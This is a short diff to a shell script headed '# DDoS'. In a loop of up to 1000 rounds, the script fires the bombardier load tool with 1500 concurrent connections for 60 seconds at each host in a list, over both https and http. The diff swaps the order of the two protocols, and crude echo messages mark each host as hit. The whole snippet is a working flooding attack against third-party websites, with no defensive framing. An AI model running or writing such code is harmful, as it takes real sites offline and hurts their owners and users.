@@ -10,10 +10,10 @@ for n in {1..1000}; do
         
         # DDoS
         echo "Fucking - ${list[i]}"
-        bombardier -c 1500 -d 60s -l http://${list[i]} --http1
-        echo "Switching to https"
-        sleep 2
         bombardier -c 1500 -d 60s -l https://${list[i]} --http1
+        echo "Switching to http"
+        sleep 2
+        bombardier -c 1500 -d 60s -l http://${list[i]} --http1
         echo "Fucked - ${list[i]}"
         sleep 2
         
